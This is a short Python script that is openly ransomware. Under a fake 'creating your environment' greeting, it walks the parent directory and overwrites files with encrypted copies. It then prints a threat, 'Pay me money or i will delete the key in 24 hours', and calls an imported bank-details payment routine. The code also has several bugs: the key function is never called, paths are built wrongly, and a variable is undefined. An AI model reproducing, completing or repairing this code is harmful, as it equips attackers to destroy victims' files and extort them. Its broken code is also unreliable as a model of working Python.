# importing all required libraries
import fernet,os,time,colorama,logging
print('welcome')
print('creating your environment.... please wait')
current_path = os.getcwd()
# Target files or directory
working_directory = os.path.dirname(current_path)

# generating a key
key = fernet.Fernet.generate_key

# creating a log file 
with open(current_path + 'logs','w') as log_file :
   pass
   
#time.sleep(60)    

# logging configuration
logging.basicConfig(filename = 'log_file',level = logging.ERROR)
          
        
        
# Encrypting files
def file_encrypter(path) :
    try :
        with open(path,'rb') as file :
            byte_file = file.read()
        encrypted_file = fernet.Fernet(key).encrypt(byte_file)
        with open(path,'wb') as file :
            file.write(encrypted_file)
    except Exception as error_type :
              logging.get_logger().error(f'This path ({path}) was unsuccessfully encrypted due to {error_type}')
        
    else :
            logging.log(level = 10,message = f'This {path} was successfully encrypted')
            

# getting files
def get_root_files(path) :
    for dir in os.listdir(path) :
        if os.path.isdir(dir) == True :
            get_root_files(dir)
        else :
            file_encrypter(dir)

# scanning for targets
for target in os.listdir(working_directory) :
    if target == 'Ransomware by Destiny' :
        continue
    if os.path.isdir(target) == True :
         get_root_files(target)
    else :
         pass
         file_encrypter(path)  
print(colorama.Fore.RED + 'You have been hacked')
print('All your files are encrypted')
print('Pay me money or i will delete the key in 24 hours ....')
#time.sleep(6)
print(colorama.Style.RESET_ALL + colorama.Style.BRIGHT)


# intializing mode for payment
from bank_details import bank_info,money_logger
bank_info()

